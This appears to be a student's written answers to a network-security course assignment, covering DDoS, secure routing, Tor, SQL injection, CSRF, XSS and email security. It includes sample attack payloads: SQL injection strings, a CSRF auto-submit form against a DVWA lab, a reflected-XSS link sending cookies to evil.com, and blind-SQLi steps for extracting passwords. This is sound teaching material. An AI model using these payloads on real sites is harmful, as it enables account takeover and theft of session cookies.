# Answer of Assignment

> 沈韵沨 3200104392

## 1 DDoS

### 1.1 What is the difference between DoS attacks and DDoS attacks?

​	Since `DoS` means *Denial of Service*, while `DDoS` means ***Distributed** Deinal of Service*, the diffrence between those 2 kinds of attacks is whether tzhe attacker use single machine or a number of zombies to perfrom the attack.

- For `DoS`, the attacker use a single machine to exhaust victim's resource by applying IP Spoofing, SYN Flood attack, UDP Flood attack and so on. As a result, the victim would be overloaded and could not fulfill legitimate requests.
- For `DDoS` , the attacker usually controls many zombies(might locate at different subnets) and use them to attack the victim. In this case, attack comes from *distributed* resources, and it's more destructive than `DoS`.

### 1.2 How does the TCP SYN Flood attack work?

​	TCP SYN Flood attack works because the server commits reources *before* confirming the identify of client(right after receiving SYN package from client, and doesn't care about whether it sends ACK back).

​	When receive a SYN from possible client, the server would push it into the backlog queue and return a SYN+ACK. If the malicious client doesn't send a ACK back, the corresponding packet would remain in the queue until timeout.

​	Thus, assuming that the size of backlog queue is $N$, and the timeout interval is $t$min, the attacker just have to send $N$ SYN packet(with random source IP address) every $t$ minutes and doesn't reply, then the victim's backlog queue would always be filled with forged packets and those legitimate requests would never be fulfilled.

### 1.3 How does the solution of SYN Flood attack work?

- Block the attacking resource.
  Ignore requests from possible attackers.
  => Doesn't work well when attackers apply IP Spoofing or DDoS.

- Random delete.
  Randomly delete a package in the queue when the backlog queue is full. Since normal client would try to request for the second time while the forged ones don't, it might remove some illegal requests.

- Increase backlog queue size.
  When the backlog queue is larger, attacker should send more packets to exhaust the victim. Legitimate request might thus successfully occupy a place in the queue and then be fulfilled.
  => Doesn't work well when attackers sends more SYN packets.

- Decrease timeout.

  Forged packet without ACK reply would be clear out of the queue sooner, and spare space for legitimate requests.
  => This might interrupt normal service requests if clients couldn't reply in time.

- Use SYN Cookies.
  Avoid storing state on server until 3-way handshake completes. Instead, hide necessary informations in the SYN+ACK package and send it back to the client and allocate resource after confirming the identify of client when received ACK package.

  - In the SYN+ACK package, the server sends $SN_s$ back to client, which contains informations of time, MSS and hashed value of client and server.
  - In the ACK package, client sends SYN+1(value in the 1^st^ step) & $SN_s' = SN_s+1$ back to server.
  - The server recompute $SN_s$ according to the header of ACK, and compare it to $SN_s'-1$ to verify the identity of client. Only allocate resource to the client and establish connection if those 2 values can match($SN_s$ is valid).

### 1.4 How does the DNS Amplification Attack work? How to defend against it?

​	Attacker sends a DNS query of type **ANY** to retrive all the available types of given name with spoofed source IP address of the victim, thus the reply of the **open** DNS server would be send to the victim.

​	Since the DNS query only takes 60 Bytes, while the EDNS Response send by the DNS server is pretty large, for example 3000 Bytes, the attack is then amplified 3000/60 = 50 times.

---

Solutions:

- Reduce the number of open resolvers or disable **ANY** request on them.
- Apply source IP verification - use ingress filtering to stop spoofed packets leaving network.
- Disable UDP service on the victim.

## 2 DDoS

### 2.1 How does Memcached attack work?

1. Attacker finds a vulnerable **UDP**(there is no need to establish connection) memcached server on the Internet.
2. Attacker preload a large amount of data to the memcached server.
3. Attacker request(pretty small) to the preload data with spoofed source IP address of the victim.
4. The memcached server response preload data(very large) to the victim.

### 2.2 What is te difference between HTTP Flood and Fragmented HTTP Flood?

- `HTTP Flood` aims to exhaust the server by sending large amount of requests(GET/POST) to the server in a short interval. 
  The server might need to read/write the database or encrypt/decrypt contents, which is time & resource consuming, and thus unable to fulfill legitimate requests.
- `Fragmented HTTP Flood` aims to take the TCP connection(resource-consuming) as long as possible by split HTTP packets into tiny fragments and send them to the victim as slowly as it allows before timeout —— the server would always keep the connection.
  Since the server could only maintain a limited number of TCP connection, legitimate client might never successfully establish connection and never be served.

### 2.3 Why is Fragmented HTTP Flood relatively more challenging to detect?

​	Because the content, traffic and source of Fragmented HTTP Flood attack are very normal. From the perspective of victim, the attacker performs just like a normal user with slow Internet service.

### 2.4 How does Ingress Filtering work?

​	Check the source IP address of each packet when it try to leave a AS. If it's not in the range of the AS's subnet, then stop forwarding it.

### 2.5 How does IP Traceback work?

- Plan A
  Each router write its IP address in the packet - victim would know the complete path when receive the packet.
  Whereas, there is NO extra fields in current IP format, and if the path is long, it would take a large space in the packet.

- Plan B - Sample & Merge

  - Assumptions

    - Routers can be trusted.
    - There are sufficient packet for the victim to track.
    - The route from attacker to victim is stable.

  - How

    - For packet
      Add a field of fixed length to record *start* & *end* IP address + distance(number of hops between start & end point)

    - For each router $R$, there is probability $p$ : 
      $$
      \left\{
      \begin{align}
      p &\rightarrow start=IP_R\ ,\ distance=0\\
      1-p &\rightarrow distance==0?end=IP_R:distance++
      \end{align}
      \right.
      $$

  - The victim can piece together the complete path after receive a number of packet.

## 3 Secure Routing

### 3.1 What are the key features of the five typical dilivery schemes?

1. `Unicast`      only has 1 specified receiver.
2. `Broadcast` receivers are **all** hosts in the **same** network/subnet.
3. `Multicast` receivers are a **group** of hosts.
4. `Anycast`     receiver is **any one** host in a group.
5. `Geocast`     receivers are **all host** located at within specified geographical region.

### 3.2 What is the framework of the Dijkstra algorithm?

1. Initialization
   For each vertex $v$ in the graph $G$ (use $s$ to denote source vector )

   - $v<>s \rightarrow dist(s,v) = +\infin$ 
   - $v == s \rightarrow dist(s,v) = 0$

   [Use $S$ to record all the vectors which have confirm $dist(s,v)$, now $S = \emptyset$.]

   Let $Q = \{v\ |\ v \in G\}$.

2. Calculate 
   ```pseudocode
   while Q != emptySet:
   	u = the vertex which has min(dist(v,s)) in Q
   	Q = Q - {u}
   	[S = S + {u}]
   	for each vertex v which is adjacent to u [& v is NOT in S]:
   		if dist(s,v) > dist(s,u) + dist(u,v):
   			dist(s,v) = dist(s,u) + dist(u,v)
   ```

3. Result
   For each $v \in G$ , the min distance between $v$ & $s$ equals to $dist(s,v)$.

### 3.3 What is the framework of the Bellman-Ford Algorithm?

```pseudocode
n = number of vertex in graph G
s = the start point

for(int i = 0; i < n-1; i++): # n-1 * loop
	[flag = true]
	for each edge (u,v) in graph G:
		if(dist(s,u) + len(edge(u,v)) < dist(s,v)):
			dist(s,v) = dist(s,u) + len(edge(u,v))
			flag = false
		[if(flag) break]
```

### 3.4 How does prefix hijacking work?

1. Attacker declares to **have** certain IP prefix.
   For example, declare to own the IP prefix of Twitter. As routing algorithm is based on the IP address, all the packet want be sent to Twitter would be send to the attacker instead.
2. Attacker declares to be **near** to the certain IP prefix.
   As the routing algorithm would always choose the shortest path, the traffic aiming to reach the certain IP address would be forward to the attacker.

### 3.5 How does RPKI work? Why is it insufficient for secure routing?

- RPKI provides a certified mapping from ASes to prefixes & public keys.
  When attacker declares to **have** certain prefix, ASes could check RPKI and find it is not valid.
- Whereas, when attacker declares to be **near** to certain prefix, RPKI can do nothing.
  Thus, RPKI is insufficient for secure routing.

## 4 Anonymous Communication

### 4.1 Why is current Internet communication vulnerable to anonymity or privacy leakage?

- Many transmitted data aren't encrypted.
  - FTP & Telnet send password in clear text.
  - Many web applications use HTTP protocols without encryption.
- To exchange messages through Internet, certain IP addresses are used to specify users and are usually fixed within a communication session or more.
  And for an attacker snooping the communication who might not know the exact identities of the two users and the message content protected by encryption, he could still use it to infer critical privacy of users.

### 4.2 In which scenarios do users require the communication anonymity or privacy as concerned in sub-question 4.1?

​	When users need to complain/vote anonymously.

### 4.3 How to use proxies to secure communication anomymity? What are the possible limitations?

> Sender & Proxy have a shared key.

1. Sender send package to Proxy with the address of destination is encrypted and place inside the package.
2. Proxy decrypt the address of destination
3. Proxy send package to the destination.

Possible limitations are as follows:

- Attacker locates between Sender & Proxy - Sender exposed
- Attacker locates between Proxy & Receiver - Receiver exposed
- 2 attackers collude to correlate ingress & egress proxy traffic - Both Sender & Receiver exposed
- Proxy is the attacker - Both Sender & Receiver exposed

### 4.4 How does Onion Routing provide a better guarantee for anonymity?

- Sender
  1. Connect to Tor entry.
  2. Randomly select a series of Tors.

- Tors

  - Relay messages in sequence.

  - Each Tor would negotiate a shared key with nodes that is directly connect to it.
    => just know the address of neighbor Tor node, but don't know about the route information of the source & destination.

  - The package send by Sender is $\{\{\{\{msg\}_D,D\}_C,C\}_B,B\}_A$, the final message could only decrypted by the destination.

- Tor exit
  Relay message to destination.

​	Onion Routing ensures that the packet is forward along the certain path and could only totally decrypted by the expected destination. Besides, each Tor could only leak the routing information about its neibhbors, which provides a better guarantee for anonymity.

### 4.5 How to infer anonymity or privacy of Onion Routing traffic?

​	Although the address of destination is hide by layers of encryption, and because of randomization, none of the nodes can know whether the next node is the destination or not, we could still correlate the Onion Routing traffic.

​	We could deploy a Tor router to attract traffic actively and then perform traffic analysis.

- Path Selection Attack
  Since Onion Routing prefer nodes with high bandwidth, we could maliciously reports high bandwidth to increase the probability to be selected.
  - If we are the entry node, then we would know the address of source.
  - If we are the exit node, then we would know the address of destination.
- Counting Attack
  If we suspect a node is a Tor, then we can correlate incoming and outgoing flows by counting the number of packets and take the matched src & dest as the former & next node in Onion Routing Path respectively.
- Low Latency Attack
  Since tor router assigns each anonymous circuit its own queue and dequeue one packet from each queue with round-robin algorithm. 
  If we suspect a specific Tor Router is used by the source, we could send a large number of packet to this router and measure the latency of source's traffic. If there is an obvious latency, then we could assume the source's packets are forwarded by this Tor router.

​	By applying all those attacks, we could reconstruct the path from source to destination, and thus eliminate anonymity of Onion Routing traffic.

## 5 Web Security

### 5.1 How does Same Origin Policy work?

​	Same Origin Policy is enforeced by browsers to make sites isolated from each other.

​	Only when 2 request path have the same protocol, hostname and port number, would they be considered   to comes from the Same Origin, and then the request be responced.

### 5.2 How does SQL Injection work? How to defend against it?

​	When attacker provides malicious inputs and Web server just give it to the SQL parser without checking / filtering, then some unexpected operations(insert/delete/update/select) would be performed on the database.

​	We could defend it through 2 ways:

1. Input Sanitization
   - Disallow special characters, like `-` or `'`
   - Use `\` in front of special characters to escape, such as quotes or backslashes, making SQL parser treat it as a 'string' but not a 'special char'.
2. Prepared Statement
   - Server developer sends an SQL statement template to the database(without params)
   - Database parses, compiles and performs query optimization on the template and store the result(withou executing it).
   - User-provided data would be sent to db via data channel and then binded as params.
     => Since user input would never be treat as 'code' and would not be parsed, SQL Injection could not be performed in the case.

### 5.3 Please refer to the slides or search online and provide two concrete examples of SQL Injection.

There are 2 examples from the slides with the same scene:

The backend does nothing to user's input, and take the result of `execute( SELECT * FROM Users WHERE user= 'INPUT')` as the result of login validation.

1. Use SQL Injection to escape validation of login
   - Attacker simply input `' or 1=1 -- `.
   - The SQL actually be performed is `execute( SELECT * FROM Users WHERE user= '' or 1=1 --')`.
     Since scripts after `--` would be ignored, this script would always return `true`.
     => The validation would always pass, while attacker knows nothing about username & password.
2. Use SQL Injection to create a new account and then pass login validation
   - Attacker input `' ; INSERT INTO TABLE Users (‘attacker’, ‘attacker secret’); --`
   - The SQL actually be performed is `execute( SELECT * FROM Users WHERE user= '' ; INSERT INTO TABLE Users (‘attacker’, ‘attacker secret’); --')`
     This script create a new account with username 'attacker' and password 'attacker secret'.
     By using this account, attacker could successfully login the system.

## 6 Web Security

### 6.1 How does a DNS hijacking attack affect network security?

​	Since DNS is used to translate domain name into IP address, DNS hijacking attack could mislead user to malicious/disguised website, and thus leak some personal information or suffered by CSRF attack.

​	Attacker could perform:

- Man in The Middle Attack
  Intercept the package between client & DNS Server, send forged response back to client.
- Attack DNS Server
  Modify record on the DNS server, every client request certain domain name would receive wrong response.
- Attack Local DNS Server
  Modify record on the Local DNS Server's cache or guide it to request attacker controlled DNS Server.

### 6.2 In HTTPS, how does a user verify a certificate for determining the authenticity of the website it connects to?

1. Check whether the certificate expires & the path on certificate is consistent with the website we visit.
2. Check whether the certificate is issued by the CA institution it claims.
   1. Use hash function to compute signature value of the content -  $V_1$
   2. Use CA's Public Key decrypt the signature of the certificate - $V_2$

​	If $V_1==V_2$ , then the certificate is issued by the given CA institution and hasn't been modified. Take the key in certificate as server's public key $Ku_{server}$ and choose to trust this website.

### 6.3 Please provide a concrete example to showcase CSRF.

​	Take Lab3 for example.

- The victim successfully logged into `http://127.0.0.1/DVWA`, the Cookie is stored by browser.

- The victim visit a malicious website like this, the form would be automatically submitted, which would send a GET Request with Cookie in its header.
  ```html
  <body>
    <form name="F" method="get" 
          action="http://127.0.0.1/DVWA/vulnerabilities/csrf">
      <input name="password_new" value="123">
      <input name="password_new" value="123">
      <input name="Change" value="set">
    </form>
    <script>
      document.F.submit();
    </script>
  </body>
  ```

- As there is victim's Cookie attached, the server would consider this request is send by the victim himself and change the password of the victim's account.

### 6.4 Please provide two concrete examples to showcase Stored XSS and Reflective XSS.

- Stored XSS (from Lab3)
  	There is a message board displayed in the page and the backend just directly store user input into database without any filtering.

  - We can input some malicious code:
    <img src="/Users/shen/Desktop/网安实践/labs/Lab3/img/10-input.png" alt="10-input" style="zoom:38%;" />
  - And when **any other user** try to load this page, the backend would directly return this message(stored in the database), and finally be treated as 'script' but not 'text':
    ![10-canelHTTPOnly](/Users/shen/Desktop/网安实践/labs/Lab3/img/10-canelHTTPOnly.png)

- Relective XSS (from slide)

  - Attacker construct a malicious hyper-link like:
    ```html
    <a href="http://bank.com/search.php?term=
      <script>
        window.open(\"http://evil.com/?cookie=\"+document.cookie)
      </script>">
      New Arrival
    </a>
    ```

  - When victim click this link, the browser would go to `http://bank.com/search.php` with query parameter `term = <script>window.open(\"http://evil.com/?cookie=\" + document.cookie)</script>`.

  - The server would then return with a page like:
    ```html
    <body>
      You have input:</br>
      term = <script>window.open(\"http://evil.com/?cookie=\"+document.cookie)</script>
    </body>
    ```

  - When victim's browser try to render this page, it would send a GET query to attacker(`http://evil.com`) with victim's Cookie in its body.

  - Attacker can steal victim's identity by using their Cookie now.

## 7 Email Security

### 7.1 Plaese describe common threats against Email security.

- `Authenticity-related Threats`
  Unauthorized user may *access* to an email system.

- `Integrity-related Threats`
  Email content may be *modified* by unauthorized user.

- `Confidentiality-related Threats`
  Sensitive information may be *disclosed* to unauthorized user.

- `Availability-related Threats`
  End user couldn't use the service - they could not successfully send/receive email.

### 7.2 How should an Email be protected to support both Authentication and Confidentiality?

- Authentication
  	The sender need to use SHA-256 to genereate a 256bit digest of the message first, and then encrypt it with its own private key as the signature, which would be append to plain text of message.
  	After receive the message, receiver would decrypt it with sender's public key. The identity of sender could be confirmed in this way.
- Confidentiality
      Before sending the message, the sender would generate a random 128bit number as a one-time secret key, and use it to encrypt both message and signature. The one-time key itself would be encrypted by using receiver's pubilc key.
      After receiving the message, the receiver should first use its own private key to decrypt one-time key, and then use the one-time key to decrypted the message, which ensured the confidentiality of the email content.

### 7.3 Please describe the difference among DANE, SPF and DKIM.

- `DANE`
  Prove that a certificate could be trust and use DNSSEC to ensure record could not be modified during the transportation process.
  Also allows server to securely specify exactly *which* TLS/SSL certificate an application or service should use to connect to its site.
  - Using TLSA record to specify which CA can vouch for a certificate, or which specific Public Key Infrastructure end-entity certificate is valid. Thus, a service certificate or a CA can be directly authenticated in the DNS itself.
- `SPF`
  It ensure that the host IP address of the mail truly belong to the domain name it claims.
  - ADMDs should publish SPF records(DNS TXT records) in previous to specify which hosts/IP-addresses are permitted to use their names.
  - After receiving an email, receiver would use published SPF record to check whether the source IP is permitted to user the domain name it claims to belong.
- `DKIM`
  It ensure that the host IP address of the mail truly belong to the domain name it claims based on **signature**.
  - ADMDs should publish their publish key in DNS TXT records in previous.
  - When sending the email, the sender shoul sign email message by a private key of the administrative domain from which the himself originates.
  - After receiving an email, receiver published DKIM record to get corresponding public key to verify the signature.

## 8 Traffic Analysis

### 8.1 Please describe the properties of the four types of commonly used Firewall.

- `Packet-filtering Firewall`
  Apply a set of rules to **each** incoming and outgoing IP packet to decide whether forward or discard it.
  Don't care about the context.
- `Stateful Inspection Firewall`
  Check both singal packet and its **context**.
- `Application Proxy Firewall`
  Act as a relay of **application-level** traffic.
- `Circuit-level Proxy Firewall`
  Act as a relay of **TCP segments** without examining the contents.

### 8.2 What are the differences among Firewall, IDS and IPS?

- `Firewall`
  Limit the traffic by given rules, could not detect intrusions.
- `IDS`
  Try to **detect** unusual patterns of activity or patterns of activity that are known to correlate with intrusions and then **warn** the user.
- `IPS`
  An extension of IDS to attempt to **block or prevent** detected malicious activity.

### 8.3 Please list commonly used methods for obfuscating traffic to evade detection?

- Encrypt traffic to hide payloads

- Use proxy to hide entire packets

- Introduce noise traffic to hide patterns
  => Obfuscate transmission interval by dummy packets
- Obfuscate packet size by padding

## 9 Authentication Efficiency

​	**Consider a time\-consuming authentication scenario where a database records all secret keys of a large number of  users.  When the system authenticates a user, it first issues a challenge message to the user. The user then uses his/her key to encrypt the challenge and then returns the encrypted challenge to the system. The system then encrypts the challenge using one key in the database after another and compares the result with the received encrypted message. Once a match is found,  the system accepts the user. Otherwise, the user is denied. This authentication protocol surely takes a lot of time and computation.**

​	**Design a possible solution to speed up the authentication process.**

- Each user should have an *unique ID* in this system.
- The system store key-value pairs of $(hash(ID_{user}),\ K_{user})$.
- The user should send $(ID_{user},\ E[K_{user},\ challengeMsg])$ back to the system.
- The system use $key = K[hash(ID_{user})]$ to decrypt the returned message.
  If it match the original challenge message, then accept the user. Reject it vice versa.

## 10 Design

​	**Design a question that you think is feasible as an exam question.**

### 10.1 Which topic among the lectures you would like to consider?

​	Web Security!

​	Since Lab3 is pretty interesting and I just simply ignore possible vulnerabilities when doing B/S development.

### 10.2 Describe a (sufficiently complex) question.

> Just a question in Lab3 (maybe it's too time-consuming).

​	Describe the basic steps of using boolean-based SQL injection to steal first 3 user's password.

​	The query sentence to be executed is (`INPUT` stands for the string you'd like to input):
```sql
SELECT first_name, last_name, FROM users WHERE user_id = ${INPUT};
```

​	If the query is successfully executed & n(row) of the result > 0, then return `true`, else return `false`.

### 10.3 Provide also a correct sample solution.

1. Judge the type of the injection(char type / number type)

2. Find the length of the database_name.

3. Find the name of database by check the ASC_II value of each char.

4. Find the total number of tables in the database.

5. Find the length of each table_name.

6. Find the names of each table.

7. Guess the name of column which store 'username' and 'password'.

8. Get the value of 'password'.

   1. Find the length of 'password' of current line.

   2. Find each characters of password in current line.